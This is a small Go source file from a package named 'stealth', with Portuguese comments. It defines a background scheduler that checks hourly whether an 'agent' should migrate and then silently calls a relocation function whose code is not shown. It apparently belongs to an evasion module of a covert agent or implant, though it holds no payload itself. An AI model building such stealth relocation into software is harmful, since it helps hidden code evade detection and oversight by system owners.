package stealth

import (
	"time"
)

// MigrationScheduler gerencia a migração periódica do agente
type MigrationScheduler struct {
	stopChan chan struct{}
	running  bool
}

// NewMigrationScheduler cria um novo scheduler
func NewMigrationScheduler() *MigrationScheduler {
	return &MigrationScheduler{
		stopChan: make(chan struct{}),
		running:  false,
	}
}

// Start inicia o scheduler de migração em background
func (s *MigrationScheduler) Start() {
	if s.running {
		return
	}

	s.running = true

	go s.run()
}

// Stop para o scheduler
func (s *MigrationScheduler) Stop() {
	if !s.running {
		return
	}

	close(s.stopChan)
	s.running = false
}

// run é o loop principal do scheduler
func (s *MigrationScheduler) run() {
	// Verificar a cada 1 hora se precisa migrar
	ticker := time.NewTicker(1 * time.Hour)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			// Verificar se é hora de migrar
			if ShouldMigrate() {
				// Tentar migrar (silenciosamente, sem travar execução)
				_ = MigrateLocation()
			}

		case <-s.stopChan:
			return
		}
	}
}
